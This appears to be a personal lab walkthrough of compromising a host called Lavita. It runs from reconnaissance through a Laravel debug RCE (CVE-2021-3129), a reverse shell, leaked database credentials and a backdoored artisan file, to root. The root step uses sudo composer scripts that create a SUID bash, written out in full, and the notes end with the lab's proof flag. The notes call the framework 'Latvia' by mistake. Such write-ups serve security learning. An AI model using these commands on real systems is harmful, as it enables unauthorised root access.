My IP: 192.168.45.211
Target IP: 192.168.115.38

nmap:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: W3.CSS Template
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

Port 22: If we get creds to we can exploit this!

Port 80: Web page lets browse around...
- Under Ourteam is a list of people who work for the company or service. 
	- Johnny Skunk
	- Rebecca Flex
	- Jan Ringo
	- Kai Ringo
- There is a register and login page. After fulfilling requirements to create an account, I then logged in with my account. We then land on the Dashboard testing area. Here we can upload a file:
![[Pasted image 20260711223359.png]]- What then happens is we notice the APP_DEBUG button. Enabling it allows us to see a debug splash page. The question was how do i now activate it. 
- I  then turned on burpsuite to see what happens when i send files through. At the same time i ran gobuster to see if we can find any uploads directory or something similar.
	- Found nothing with gobuster
- I however after sending a file through and catching this request we find a new directory appear in gobuster (/upload-image) which is a splash page 
![[Pasted image 20260711224853.png]]

- here we find a version number and the service. 
	- We know the service is Latvia; version -> `8.4.0`
- Lets see if we can find exploits for this service
	- I find[ CVE-2021-3129](https://www.exploit-db.com/exploits/49424)
	- I had trouble fully understanding the exploitdb page especially with the usage so I decided to go finding a github with an already file for me and perhaps even more explanation as for how they want me to use the script.
	- so.. i ended finding this [repo](https://github.com/joshuavanderpoll/CVE-2021-3129)
- command execution works, and then I ended up setting up a reverse shell and was able to get in as www-data.

- I end up stabilizing my shell and then run /etc/passwd so we can enumerate more users.
`skunk:x:1001:1001::/home/skunk:/bin/bash`
- Ended up realizing that we could read skunks local.txt from www-data however, finding out from /etc/passwd, that skunk has sudo privleges which likley is the user we need to pivot to in order to priv esc.
- After exaughsting all of my priv esc notes, I went ahead and ran linpeas. Linpeas came back with a database username and password. 
- It is possible to use these credentials in mysql to try and enumerate sql files for more users however this led to a dead end.
```
DB_USERNAME=lavita
DB_PASSWORD=sdfquelw0kly9jgbx92
```
![[Pasted image 20260712015632.png]]

- I decided to think that what if there were file that was running behind the scenes that we didnt see so i ran pspy to see what we could find 
	- We find that there is a file underneath the user we are currently signed in as that there is a php file under /var/www/html/lavita/artisan thats running a command. Because its under our directory we should be able to edit it.
- Sure enough I was able to thus placing a rev shell inside of that file file.

![[Pasted image 20260712020322.png]]

- After doing so we are now in as skunk.
- As i mentioned because we can run sudo -l, we then can see what cool things we can do with it
![[Pasted image 20260712020703.png]]

Here says that using composer we can then run all files under lavita, again, a user we already have access to and can change files under its directory. 

- Searching [gtfobins](https://gtfobins.org/gtfobins/composer/#shell) under composer we find this `echo '{"scripts":{"x":"/bin/sh"}}' >composer.json;composer run-script x`. Meaning we create a script named `x` and give it a command to run. Because the composer script runs under `sudo` (as root), instead of spawning another reverse shell the cleaner path to root is to have that root-run command **make a root-owned copy of bash and set the SUID bit on it** — then any user who runs that copy gets root.

> **SUID, not "changing a UID."** The `cp` runs as root, so `/tmp/bash` is owned by root. `chmod +s` sets the SUID bit (`-rwsr-xr-x`) — an SUID binary executes with the **owner's** privileges (root), not the caller's. Running it with `/bin/bash -p` keeps euid=root (bash otherwise drops privileges on startup). The plain execute bit (`+x`) alone does nothing here — a root-owned `+x` binary still runs as *you*.

- So on lavita, instead of `/bin/sh` we do:
```bash
echo '{"scripts":{"x":"cp /bin/bash /tmp/bash;chmod +x /tmp/bash"}}' > composer.json  # +x only = no privesc (still runs as skunk)

echo '{"scripts":{"y":"cp /bin/bash /tmp/bash;chmod +s /tmp/bash"}}' > composer.json  # +s = SUID root = the one that works
```

> On the second run I got `cp: cannot create regular file '/tmp/bash': Text file busy` — that's because `/tmp/bash` from the first run was still executing, so `cp` couldn't overwrite it. It didn't matter: the `;` still ran `chmod +s` on the already-existing root-owned copy, which is the only part that mattered.

> **Cleaner one-shot next time** — skip the two-step entirely (`cp` already copies bash's execute bit, so `+x` was never needed) and use a fresh filename so nothing is busy:
> ```bash
> echo '{"scripts":{"x":"cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash"}}' > composer.json
> sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
> /tmp/rootbash -p
> ```
> `chmod 4755` = SUID (`4`) + `rwxr-xr-x` (`755`) in one command.

```
sudo /usr/bin/composer --working-dir\=/var/www/html/lavita run-script y
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> chmod +s /tmp/bash
/tmp/bash -p
whoami
root
cat /root/proof.txt
e5064b0cc94cc91ef3d2d54e388d060a

```